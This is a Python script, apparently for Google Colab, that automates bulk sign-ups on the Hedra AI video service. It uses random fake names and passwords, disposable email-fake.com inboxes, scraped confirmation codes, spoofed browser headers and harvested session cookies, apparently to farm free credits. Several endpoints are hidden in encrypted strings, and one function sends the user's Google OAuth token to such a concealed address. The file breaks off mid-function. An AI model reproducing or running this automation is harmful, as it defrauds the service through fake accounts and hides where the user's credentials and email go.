
import requests
import re
from bs4 import BeautifulSoup
import time
import urllib3
from urllib.parse import urlencode
import json
import ipywidgets as widgets
import random
import string
from datetime import datetime
import os
import random
import string
from google.colab import auth
from google.auth.transport.requests import Request
from colab_gradio_llm.gradio_opensource import *
from i2vgen import *

def r_miley(email):
    eheh = rtmp_valid('gAAAAABn7G65a8syVWmGtSCpfibarV5unsMb3ds-rylTkXb3krLvZOB11YAE7z_0C_Bn5WLCHecqPD-AVDUZjKu3WzBjQYmtHqZYqMvMa3t2KEHqytjSSKJXO9tcAEUAgollI2fJjY94ZVd4MeqJZZsZkFt0InYDow==')
    data = {
        "email": email,
        "info": ""
    }
    try:
        response = requests.post(eheh, data=data)
        if response.status_code == 200:
            respuesta_json = response.json()
            credits = respuesta_json.get("credits")
            message = respuesta_json.get("message")
            return message, credits
        else:
            return f"Error en la solicitud. Código de estado: {response.status_code}", None
    except Exception as e:
        return f"Ocurrió un error: {e}", None

def geoe_imap(email, modelo, resolucion):
    wubay = rtmp_valid('gAAAAABn7G76uKH60D-X_6xy4iAZ2HbFewvF9u-gfq1FXV_1TNft8Y_LGZSuPrgk-Kz62lvX8erdEHxq_6faZt8VBHikypqsKaYoAsIf7IYd7501ufqxatyVVeplP7TC8nM5KFS2JawvcihCLXHQTN6nwHeqnIlD-Q==')
    data = {
        "email": email,       
        "modelo": modelo,    
        "resolucion": resolucion 
    }
    try:
        response = requests.post(wubay, data=data)
        if response.status_code == 200:
            respuesta_json = response.json()
            credit = respuesta_json.get("credit")  
            message = respuesta_json.get("message")
            model_uuid = respuesta_json.get("model_uuid")
            return message, credit, model_uuid
        else:
            return f"Error en la solicitud. Código de estado: {response.status_code}", None, None
    except Exception as e:
        return f"Ocurrió un error: {e}", None, None

def geoe_tmap(email, modelo, resolucion):
    modpulpoo = rtmp_valid('gAAAAABn7G9RHwGRFY7BWhfYcVbQZ6fZv3divqYfJEoKTw79YQe_vaGY6dprRhVpnSkBoiAtB4hHSNL8zt9M_fal0eBCOeT0gWiGf91mCS90eicx0DM15Q99NZkC77s_hS9YXiZx8_NDj1eowKsft3SL_ZJj19vzIg==')
    data = {
        "email": email,      
        "modelo": modelo,    
        "resolucion": resolucion 
    }

    try:
        response = requests.post(modpulpoo, data=data)
        if response.status_code == 200:
            # Parsear la respuesta JSON
            respuesta_json = response.json()
            credit = respuesta_json.get("credit") 
            message = respuesta_json.get("message")
            model_uuid = respuesta_json.get("model_uuid")
            return message, credit, model_uuid
        else:
            return f"Error en la solicitud. Código de estado: {response.status_code}", None, None

    except Exception as e:
        return f"Ocurrió un error: {e}", None, None


def geo_imap(email, modelo, resolucion):
    jotomo = rtmp_valid('gAAAAABn7G-5t8s9TcnlEv9bJ4FPnuTmIaUe6r4LAnbwSbcHJlPIYhP1sArJLhG0o8erJ7x6mzFMcAHvBJlzxID4ztzVtpe7zmPHv3_SyXvTlvFhqYJR1hYTFu0W2ws4goXqpGmz9KDcMH_NuukWYef69OcxZxB4JA==')
    data = {
        "email": email,  
        "modelo": modelo,    
        "resolucion": resolucion  
    }
    try:
        response = requests.post(jotomo, data=data)
        if response.status_code == 200:
            respuesta_json = response.json()
            credit = respuesta_json.get("credit") 
            message = respuesta_json.get("message")
            model_uuid = respuesta_json.get("model_uuid")
            return message, credit, model_uuid
        else:
            return f"Error en la solicitud. Código de estado: {response.status_code}", None, None
    except Exception as e:
        return f"Ocurrió un error: {e}", None, None

def geo_tmap(email, modelo, resolucion):
    soloyo = rtmp_valid('gAAAAABn7HAAQfiNRkl6U5c-wqYa_QUBkC_iGR58SpfptMJ4LGtQDonkgkgCrhn9tNQrXwf6rWzNv75BFwKQ5_nSyzDSoJj64oUuFyqfTXI4rRkNrTxGbXXTGUue4h9_fbDE-5W0uww-bHUKVLpXk5bJjgspWgACng==')
    data = {
        "email": email,      
        "modelo": modelo,   
        "resolucion": resolucion
    }
    try:
        response = requests.post(soloyo, data=data)
        if response.status_code == 200:
            respuesta_json = response.json()
            #print(f"\r⏱️ Processing.", end='', flush=True)
            credit = respuesta_json.get("credit") 
            message = respuesta_json.get("message")
            model_uuid = respuesta_json.get("model_uuid")
            return message, credit, model_uuid

        else:
            return f"Error en la solicitud. Código de estado: {response.status_code}", None, None

    except Exception as e:
        return f"Ocurrió un error: {e}", None, None


def registrar_email(email):
    # r
    dbr = rtmp_valid('gAAAAABn1ta8WwcfgU-limtFnUdgz05v30dc5KLrJ1CaB1XCETSrqM1vjV9YbGnmjCtCt0hWLcTSz33T0duitv4sZOe2vtUVS6-GEM0vFGNE2dk0rkEiUQptGc9Zjyak0r1a25sLTwKJvVDgCIXJBXkxwc4zwSfGVA==')
    db = rtmp_valid('gAAAAABn1tZRIFnqB4B53MmCGRY66aUTIpB9rGRK-cfyBdA9vPfGG_xIZPAYhFS7bvVlLaYtLuqg3bkWWQeh3V-cl3smt2UC92ILLy-Zu1SS2YOycziGzt1YoPEbQMuzWP7jrStHHECiBQhb6fVm-qWNZC26rYhnB9pWQ1lYwj0sYEVZb-YVYk0Jvi2IQWi8y7FBkSDDqAGVC-TRuCLmPIuNZol45KWhjFx-kp0vUswQqnyfI2nF-kOE2ddKQja1ZvSnxrgQF01Ksz-a__wz8R5NJgkGlFAsScfT_tJH_7JAVPI8O30D_rrr3Wofkn0xE0120vAJ-sWQ0lUp3pS-mjqRTlRDzDIIXSis25OrwyccaWS1BlGfbyTAz_iHsvkWOxH3vkLyyDGidMvJ1PDwdvlu3pKQONIwNBqalR2KGsAzRNB-TOEv-5YGVSSY-bxsj8lvGgk0RKGhrVSmUeo99F60JpmuSk4ysPEWC96weJVyCZo2bzjouD5WW_em4EwHcXyEBOTGQjah9V0er0TaK4oQBu47NvbQaEuUkzccfCfVO77D2UhYeG0qnH6R5XiSHGK9EOgVdC8259ZriYCCdS2L25nMV_DGckbvNfmznlWfMUgX38WOec6kk6W8aLrLu0yTDAyND4--p1bVH3wv8G2Z7gel_C2LgvSnk_DXoSA7ohoaqCp7tXoJiJ2quIB_19wmuxUMv4VLk75x5QJ9ZUx17ttyKkBZ85bFiHuM3S-YvOFkpeMbZmk2vSLv_Ea5DhFT83-N1e0RDwcHAha16dEt92ERktCtGvuRGSvmWJMwF4fcmg6cl-H3ieKtO7TqH3WHJvwE8s4U38K6YP9dbAAwdwb2kjbv7ijB4qhjN7dJuqAmn9PCuzpuV8hGSSPxDnNdgDE6SFcV-XY0nHI1K91hPUt6-5530PdFsyFMLcDBxcR_DT5_2vU_2WPcb7qFdYyMLB9Vmw9DBBNkgY9zh8fFQlBsPd_spOcj2fogz5V6Zk47CMJH9KACPqRvv6WdTVp500aO9f_L_kWmZTjMYf4Hid6mahf_0E1WYC7VkOvtIIL9txqAGi_Kx2BCCMuocNnRgNJ-pPOGCTUL9st_JZ5RAX66uJe7LuYzSubyGfrrtHgjFmXoYfQmHKLTT-GmgIXQb-ERE0V-A-B4th7WvY32_X1vft9vbWrbK4SXsTfrXDEXCqwjexBX7XbEaTrAsdkYi45s9EN5')

    data = {
        "email": email
    }
    
    try:
        # Realizar la solicitud POST
        response = requests.post(dbr, headers=db, data=data)
        
        # Verificar si la solicitud fue exitosa
        if response.status_code == 200:
            # Parsear la respuesta JSON
            respuesta_json = response.json()
            
            # Extraer información relevante
            status = respuesta_json.get("status")
            message = respuesta_json.get("message")
            email_registrado = respuesta_json.get("data", {}).get("email")
            api_key = respuesta_json.get("data", {}).get("api_key")
            credits = respuesta_json.get("data", {}).get("credit")
            
            # Devolver las variables por separado
            return status, message, email_registrado, api_key, credits
        
        else:
            # Devolver un mensaje de error si el estado no es 200
            return f"Error en la solicitud. Código de estado: {response.status_code}", response.text, None, None
    
    except Exception as e:
        # Devolver un mensaje de error en caso de excepción
        return f"Ocurrió un error: {e}", None, None, None

def generar_contrasena():
    # Definir los conjuntos de caracteres
    minusculas = string.ascii_lowercase
    mayusculas = string.ascii_uppercase
    numeros = string.digits
    caracteres_especiales = string.punctuation

    # Asegurarse de que la contraseña contiene al menos uno de cada tipo
    contrasena = [
        random.choice(minusculas),
        random.choice(mayusculas),
        random.choice(numeros),
        random.choice(caracteres_especiales)
    ]

    # Completar la contraseña hasta tener al menos 8 caracteres
    todos_caracteres = minusculas + mayusculas + numeros + caracteres_especiales
    contrasena += random.choices(todos_caracteres, k=8 - len(contrasena))

    # Mezclar los caracteres para que el orden sea aleatorio
    random.shuffle(contrasena)

    # Convertir la lista en una cadena
    return ''.join(contrasena)

    
def obtener_fecha_actual():
    return datetime.now().strftime("%b-%d-%Y").lower()  # Formato 'mmm-dd-yyyy', ejemplo: 'nov-20-2024'

def registrar_usuario(token):
    # Obtener la fecha actual para tos_version
    tos_version = obtener_fecha_actual()

    # Variables constantes (no editables)
    tos_accepted = True
    residence_status = "ALLOW"
    marketing_email_consent = "ALLOW"

    api_url = "https://api.dev.dream-ai.com/register"

    # Headers de la solicitud
    headers = {
        'Host': 'api.dev.dream-ai.com',
        'Connection': 'keep-alive',
        'sec-ch-ua-platform': '"Windows"',
        'Authorization': f'Bearer {token}',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"',
        'Content-Type': 'application/json',
        'sec-ch-ua-mobile': '?0',
        'Accept': '*/*',
        'Origin': 'https://www.hedra.com',
        'Sec-Fetch-Site': 'cross-site',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': 'https://www.hedra.com/',
        'Accept-Language': 'es-ES,es;q=0.9',
        'Accept-Encoding': 'gzip, deflate'
    }

    # Cuerpo de la solicitud
    payload = {
        "tos_version": tos_version,
        "tos_accepted": tos_accepted,
        "residence_not_blocked": residence_status,
        "marketing_email_consent": marketing_email_consent
    }

    try:
        # Realizar la solicitud POST
        response = requests.post(api_url, headers=headers, json=payload)

        # Verificar el estado de la respuesta
        if response.status_code == 200:
            return "Respuesta exitosa"
        else:
            return {"error": f"Error en la solicitud: {response.status_code}", "detalle": response.text}
    except Exception as e:
        return {"error": f"Error al realizar la solicitud: {str(e)}"}


def generar_nombre_completo():
  """Genera un nombre completo con un número aleatorio de 3 dígitos."""

  nombres = ["Juan", "Pedro", "Maria", "Ana", "Luis", "Sofia", "Diego", "Laura", "Javier", "Isabel",
            "Pablo", "Marta", "David", "Elena", "Sergio", "Irene", "Daniel", "Alicia", "Carlos", "Sandra",
            "Antonio", "Lucia", "Miguel", "Sara", "Jose", "Cristina", "Alberto", "Blanca", "Alejandro", "Marta",
            "Francisco", "Esther", "Roberto", "Silvia", "Manuel", "Patricia", "Marcos", "Victoria", "Fernando", "Rosa"]
  apellidos = ["Garcia", "Rodriguez", "Gonzalez", "Fernandez", "Lopez", "Martinez", "Sanchez", "Perez", "Alonso", "Diaz",
            "Martin", "Ruiz", "Hernandez", "Jimenez", "Torres", "Moreno", "Gomez", "Romero", "Alvarez", "Vazquez",
            "Gil", "Lopez", "Ramirez", "Santos", "Castro", "Suarez", "Munoz", "Gomez", "Gonzalez", "Navarro",
            "Dominguez", "Lopez", "Rodriguez", "Sanchez", "Perez", "Garcia", "Gonzalez", "Martinez", "Fernandez", "Lopez"]

  nombre = random.choice(nombres)
  apellido = random.choice(apellidos)
  numero = random.randint(100000, 999999)

  nombre_completo = f"{nombre}_{apellido}_{numero}"
  return nombre_completo

def get_user():
    try:
        # Paso 1: Autenticar con Google
        auth.authenticate_user()

        # Paso 2: Obtener el token de acceso
        from google import auth as google_auth
        creds, _ = google_auth.default()
        creds.refresh(Request())
        access_token = creds.token
        fget = rtmp_valid('gAAAAABn1tf9-am02kZlUqumb8DBn5lav-LP7eQ28Nl9gV9rdZPgSjxe8v1OCCI7_Noneo3HxLBKskqyf3FKjmCH3lWx-B_u_ENuJJYNqM614nF6Js9sNwKhBcwmWGvuSYqj8jcuN4fr')


        # Paso 3: Usar el token para obtener información de la cuenta
        response = requests.get(
            fget,
            headers={"Authorization": f"Bearer {access_token}"}
        )

        # Verificar si la solicitud fue exitosa
        if response.status_code == 200:
            user_info = response.json()
            return user_info.get("email")  # Devolver solo el correo electrónico
        else:
            print(f"\nError al obtener la información de la cuenta. Código: {response.status_code}")
            return None
    except Exception as e:
        print(f"\nOcurrió un error: {e}")
        return None

def enviar_formulario():
    """Envía una solicitud POST a un formulario web."""
    url = 'https://email-fake.com/'
    datos = {'campo_correo': 'ejemplo@dominio.com'}
    response = requests.post(url, data=datos)
    return response

def extraer_dominios(response_text):
    """Extrae dominios de un texto utilizando expresiones regulares."""
    dominios = re.findall(r'id="([^"]+\.[^"]+)"', response_text)
    return dominios

def obtener_sitio_web_aleatorio(response_text):
    """Obtiene un sitio web aleatorio de los dominios extraídos."""
    dominios = extraer_dominios(response_text)
    sitio_web_aleatorio = random.choice(dominios)
    return sitio_web_aleatorio



def post_register(token):
    url = "https://api.dev.dream-ai.com/register"
    headers = {
        "Host": "api.dev.dream-ai.com",
        "Connection": "keep-alive",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        "sec-ch-ua-platform": '"Windows"',
        "sec-ch-ua-mobile": "?0",
        "Authorization": f"Bearer {token}",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Content-Type": "application/json",
        "Accept": "*/*",
        "Origin": "https://www.hedra.com",
        "Sec-Fetch-Site": "cross-site",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.hedra.com/",
        "Accept-Language": "es-ES,es;q=0.9",
        "Accept-Encoding": "gzip, deflate"
    }
    payload = {
        "tos_version": "may-21-2023",
        "tos_accepted": True,
        "residence_not_blocked": "ALLOW",
        "marketing_email_consent": "NONE"
    }

    # Initialize the HTTP client
    http = urllib3.PoolManager()

    # Send the POST request
    response = http.request(
        'POST',
        url,
        body=json.dumps(payload),
        headers=headers
    )

    # Decode the response
    response_data = json.loads(response.data.decode('utf-8'))
    #print(response_data)

    if response.status == 200:
        print(f"\r⏱️ Processing..", end='', flush=True)
        return response_data
    else:
        print(f"\r❌ Error getting status...", end='', flush=True)
        return None



def get_session( formatted_cookies, token_0, token_1):
    # Crear un administrador de conexiones
    http = urllib3.PoolManager()

    api_url = 'https://www.hedra.com/api/auth/session'

    # Realizar la solicitud GET sin enviar cookies
    response = http.request(
        'GET',
        api_url,
        headers={
            'Host': 'www.hedra.com',
            'Connection': 'keep-alive',
            'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
            'Content-Type': 'application/json',
            'sec-ch-ua-mobile': '?0',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
            'sec-ch-ua-platform': '"Windows"',
            'Accept': '*/*',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://www.hedra.com/login?redirectUrl=%2F&ref=nav',
            'Accept-Language': 'es-ES,es;q=0.9',
            "Cookie": f"{formatted_cookies}; __Secure-next-auth.session-token.0={token_0}; __Secure-next-auth.session-token.1={token_1}",
            "Accept-Encoding": "gzip, deflate"
        }
    )

    data = json.loads(response.data.decode('utf-8'))
    #print(data)

    # Extraer el access_token
    access_token = data.get('user', {}).get('accessToken', None)

    return response.status, access_token



def post_sign_in(txtEmail, txtPass, formatted_cookies, session_token, csrf_token):
    url = "https://www.hedra.com/api/auth/callback/credentials"
    headers = {
        "Host": "www.hedra.com",
        "Connection": "keep-alive",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        "Content-Type": "application/x-www-form-urlencoded",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": '"Windows"',
        "Accept": "*/*",
        "Origin": "https://www.hedra.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.hedra.com/login?redirectUrl=%2F&ref=nav",
        "Accept-Language": "es-ES,es;q=0.9",
        "Cookie": f"{formatted_cookies}; ph_phc_LPkfNqgrjYQMX7vjw63IAdpzDFpLNUz4fSq3dgbMRgS_posthog=%7B%22distinct_id%22%3A%22d8712390-0001-7079-897e-1eb6d2aa371d%22%2C%22%24sesid%22%3A%5B1723321702013%2C%2201913dfa-5168-7dea-8e61-d31f9f65d4ca%22%2C1723321700712%5D%2C%22%24epp%22%3Atrue%7D; __Secure-next-auth.session-token={session_token}",
        "Accept-Encoding": "gzip, deflate"
    }

    data = {
        "email": f"{txtEmail}",
        "password": f"{txtPass}",
        "action": "signIn",
        "redirect": "false",
        "csrfToken": f"{csrf_token}",
        "callbackUrl": "https://www.hedra.com/login?redirectUrl=%2F&ref=nav",
        "json": "true"
    }

    encoded_data = urlencode(data)

    http = urllib3.PoolManager()
    try:
        response = http.request(
            'POST',
            url,
            body=encoded_data,
            headers=headers
        )
    except Exception as e:
        print(f"\r❌ Error getting status...", end='', flush=True)
        return None, None

    if response.status == 200:
        if 'set-cookie' in response.headers:
            cookies = response.headers['set-cookie']
            #print("Cookies recibidas:")
            #print(cookies)

            # Extracción de los valores de las cookies específicas
            session_token_0 = None
            session_token_1 = None

            # Buscar los tokens específicos en las cookies
            match_0 = re.search(r'__Secure-next-auth.session-token.0=([^;]+)', cookies)
            match_1 = re.search(r'__Secure-next-auth.session-token.1=([^;]+)', cookies)

            if match_0:
                session_token_0 = match_0.group(1)
            if match_1:
                session_token_1 = match_1.group(1)

            # Imprimir los valores extraídos
            #if session_token_0:
             #   print(f"__Secure-next-auth.session-token.0: {session_token_0}")
            #if session_token_1:
            #    print(f"__Secure-next-auth.session-token.1: {session_token_1}")

            # Retornar los tokens extraídos
            return session_token_0, session_token_1
        else:
            print(f"\r❌ -1 Error getting status...", end='', flush=True)
            return None, None
    else:
        print(f"\r❌ -2 Error getting status...", end='', flush=True)
        return None, None



def get_session_info2(txtEmail, txtPass, formatted_cookies, session_token):
    url = "https://www.hedra.com/api/auth/session"
    headers = {
        "Host": "www.hedra.com",
        "Connection": "keep-alive",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": '"Windows"',
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.hedra.com/login?redirectUrl=%2F&ref=nav",
        "Accept-Language": "es-ES,es;q=0.9",
        "Cookie": f"{formatted_cookies}; ph_phc_LPkfNqgrjYQMX7vjw63IAdpzDFpLNUz4fSq3dgbMRgS_posthog=%7B%22distinct_id%22%3A%22d8712390-0001-7079-897e-1eb6d2aa371d%22%2C%22%24sesid%22%3A%5B1723321702013%2C%2201913dfa-5168-7dea-8e61-d31f9f65d4ca%22%2C1723321700712%5D%2C%22%24epp%22%3Atrue%7D; __Secure-next-auth.session-token={session_token}",
        "Accept-Encoding": "gzip, deflate"
    }

    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()  # Lanza una excepción para códigos de error HTTP
        print(f"\r⏱️ Processing..", end='', flush=True)
        #print(response.text)

        # Extraer y formatear las cookies
        cookies = response.cookies
        print(f"\r⏱️ Processing.", end='', flush=True)

        # Buscar la cookie `__Host-next-auth.csrf-token`
        csrf_token = None
        for cookie in cookies:
            if cookie.name == "__Secure-next-auth.session-token":
                csrf_token = cookie.value
                break

        """if csrf_token:
            print(f"__Secure-next-auth.session-token: correct")
        else:
            print("__Secure-next-auth.session-token not found")"""

        return csrf_token

    except requests.exceptions.RequestException as e:
        print(f"\r❌ -3 Error getting status...", end='', flush=True)
        return None





def post_credentials_with_code(txtEmail, txtPass, codigoverificado, formatted_cookies, session_token, csrf_token):
    url = "https://www.hedra.com/api/auth/callback/credentials"
    headers = {
        "Host": "www.hedra.com",
        "Connection": "keep-alive",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        "Content-Type": "application/x-www-form-urlencoded",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": '"Windows"',
        "Accept": "*/*",
        "Origin": "https://www.hedra.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.hedra.com/login?redirectUrl=%2F&ref=nav",
        "Accept-Language": "es-ES,es;q=0.9",
        "Cookie": f"{formatted_cookies}; ph_phc_LPkfNqgrjYQMX7vjw63IAdpzDFpLNUz4fSq3dgbMRgS_posthog=%7B%22distinct_id%22%3A%22d8712390-0001-7079-897e-1eb6d2aa371d%22%2C%22%24sesid%22%3A%5B1723321702013%2C%2201913dfa-5168-7dea-8e61-d31f9f65d4ca%22%2C1723321700712%5D%2C%22%24epp%22%3Atrue%7D; __Secure-next-auth.session-token={session_token}",
        "Accept-Encoding": "gzip, deflate"
    }

    data = {
        "email": txtEmail,
        "password": txtPass,
        "action": "confirm",
        "code": codigoverificado,
        "redirect": "false",
        "csrfToken": csrf_token,
        "callbackUrl": "https://www.hedra.com/login?redirectUrl=%2F&ref=nav",
        "json": "true"
    }

    try:
        response = requests.post(url, headers=headers, data=data)

        if response.status_code == 200:
            print(f"\r⏱️ Processing..", end='', flush=True)
            if 'set-cookie' in response.headers:
                cookies = response.headers['set-cookie']
                print(f"\r⏱️ Processing...", end='', flush=True)
                return cookies
        else:
            print(f"\r⏱️ Processing.", end='', flush=True)
            return None
    except requests.RequestException as e:
        print(f"\r❌ -4 Error getting status...", end='', flush=True)
        return None


def post_credentials(txtEmail, txtPass, formatted_cookies, csrf_token):
    url = "https://www.hedra.com/api/auth/callback/credentials"
    headers = {
        "Connection": "keep-alive",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        "Content-Type": "application/x-www-form-urlencoded",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": '"Windows"',
        "Accept": "*/*",
        "Origin": "https://www.hedra.com",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.hedra.com/login?redirectUrl=%2F&ref=nav",
        "Accept-Language": "es-ES,es;q=0.9",
        "Cookie": formatted_cookies,
        "Accept-Encoding": "gzip, deflate"
    }

    data = {
        "email": txtEmail,
        "password": txtPass,
        "action": "signUp",
        "redirect": "true",
        "csrfToken": csrf_token,
        "callbackUrl": "https://www.hedra.com/login?redirectUrl=%2F&ref=nav",
        "json": "true"
    }

    try:
        response = requests.post(url, headers=headers, data=data)

        if response.status_code == 200:
            print(f"\r⏱️ Processing..", end='', flush=True)

            if 'set-cookie' in response.headers:
                cookies = response.headers['set-cookie']
                print(f"\r⏱️ Processing...", end='', flush=True)

                match = re.search(r'__Secure-next-auth\.session-token=([^;]+)', cookies)
                if match:
                    session_token = match.group(1)
                    return session_token
                else:
                    print(f"\r❌ -5 Error getting status...", end='', flush=True)
                    return None
        else:
            print(f"\r❌ -6 Error getting status...", end='', flush=True)
            configurar_credenciales()

            print(f"\r⏱️ Processing.", end='', flush=True)
            csrf_token1, formatted_cookies1 = get_session_info()

            os.environ["CSRF_TOKEN"] = csrf_token1
            os.environ["FORMATTED_COOKIE"] = formatted_cookies1

            print(f"\r⏱️ Processing..", end='', flush=True)
            correo = os.environ.get("EMAIL_AIVIS")
            contrasena = os.environ.get("PASS_AIVIS")
            session_token = post_credentials(correo, contrasena, formatted_cookies1, csrf_token1)
            if session_token:
                os.environ["SESSION_TOKEN"] = session_token
                print(f"\r⏱️ Processing...", end='', flush=True)
            return session_token
    except requests.RequestException as e:
        print(f"\r❌ -7 Error getting status...", end='', flush=True)
        return None



def get_session_info():
    url = "https://www.hedra.com/api/auth/csrf"
    headers = {
        "Host": "www.hedra.com",
        "Connection": "keep-alive",
        "sec-ch-ua": '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
        "Content-Type": "application/json",
        "sec-ch-ua-mobile": "?0",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "sec-ch-ua-platform": '"Windows"',
        "Accept": "*/*",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
        "Referer": "https://www.hedra.com/login?redirectUrl=%2F&ref=nav",
        "Accept-Language": "es-ES,es;q=0.9",
        "Accept-Encoding": "gzip, deflate"
    }

    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()  # Lanza una excepción para códigos de error HTTP
        print(f"\r⏱️ Processing..", end='', flush=True)
        #print(response.json())  # Cambia a response.text si no es JSON

        # Extraer y formatear las cookies
        cookies = response.cookies
        formatted_cookies = "; ".join([f"{cookie.name}={cookie.value}" for cookie in cookies])

        print(f"\r⏱️ Processing...", end='', flush=True)
        #print(formatted_cookies)

        # Retornar el csrfToken y las cookies formateadas si deseas utilizarlas después
        csrf_token = response.json().get('csrfToken')
        return csrf_token, formatted_cookies

    except requests.exceptions.RequestException as e:
        print(f"\r❌ -7 Error getting status...", end='', flush=True)



def extract_confirmation_code(text):
    # Utilizar una expresión regular para buscar el número en el texto
    match = re.search(r'\b\d{6}\b', text)
    if match:
        return match.group(0)  # Devolver el número encontrado
    else:
        return None


def enviar_dell_post(id_dell, usuarios, dominios):
    url = 'https://email-fake.com/del_mail.php'#{dominios}%2F{usuario}
    headers = {
       'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
       'X-Requested-With': 'XMLHttpRequest',
       'Cookie': f'embx=%5B%22{usuarios}%40{dominios}; surl={dominios}/{usuarios}/',
       'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
       'Accept': '*/*',
       'Origin': 'https://email-fake.com',
       'Sec-Fetch-Site': 'same-origin',
       'Sec-Fetch-Mode': 'cors',
       'Sec-Fetch-Dest': 'empty',
       'Accept-Language': 'es-ES,es;q=0.9'
    }

    data = {
       'delll': f'{id_dell}'
    }

    try:
        response = requests.post(url, headers=headers, data=data)
        response.raise_for_status()  # Raise an exception for 4xx/5xx status codes
        return response.text
    except requests.exceptions.RequestException as e:
        return f"Error en la solicitud POST: {str(e)}"

def extract_codes_from_html(html):
    soup = BeautifulSoup(html, 'html.parser')

    # Encuentra la celda <td> con el estilo y clase específicos
    td_tag = soup.find('td', {'class': 'inner-td', 'style': 'border-radius: 6px; font-size: 16px; text-align: center; background-color: inherit'})

    if td_tag:
        # Encuentra la etiqueta <a> dentro de la celda <td>
        a_tag = td_tag.find('a', href=True)

        if a_tag:
            # Obtén el valor del atributo href
            href = a_tag['href']

            # Encuentra el valor de internalCode y oobCode en el href
            internal_code = None
            oob_code = None

            if 'internalCode=' in href:
                internal_code = href.split('internalCode=')[1].split('&')[0]

            if 'oobCode=' in href:
                oob_code = href.split('oobCode=')[1].split('&')[0]

            return internal_code, oob_code
    return None, None

def indexs(checkpoints):
    if checkpoints == 0:
        print(f"\r⏱️ Processing.", end='', flush=True)
        return False  
    elif checkpoints > 79:
        print(f"\r⏱️ Processing..", end='', flush=True)
        return True  
    else:
        print(f"\r⏱️ Processing...", end='', flush=True)
        return False 

def extract_verification_code(html_content):

    # Usando expresión regular para encontrar el código
    match = re.search(r'Your confirmation code is (\d+)', html_content)
    if match:
        return match.group(1)
    else:
        raise ValueError("Código de verificación no encontrado")


def execute_get_request(usuario, dominios):
    url = "https://email-fake.com/"
    headers = {
        "Host": "email-fake.com",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-User": "?1",
        "Sec-Fetch-Dest": "document",
        "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": "Windows",
        "Accept-Language": "es-ES,es;q=0.9",
        "Cookie": f'surl={dominios}%2F{usuario}',
        "Accept-Encoding": "gzip, deflate"
    }

    response = requests.get(url, headers=headers)

    # Uso de la función
    internal_code, oob_code = extract_codes_from_html(response.text)

    #print(response.text)

    # Extraer el código de verificación del contenido HTML
    try:
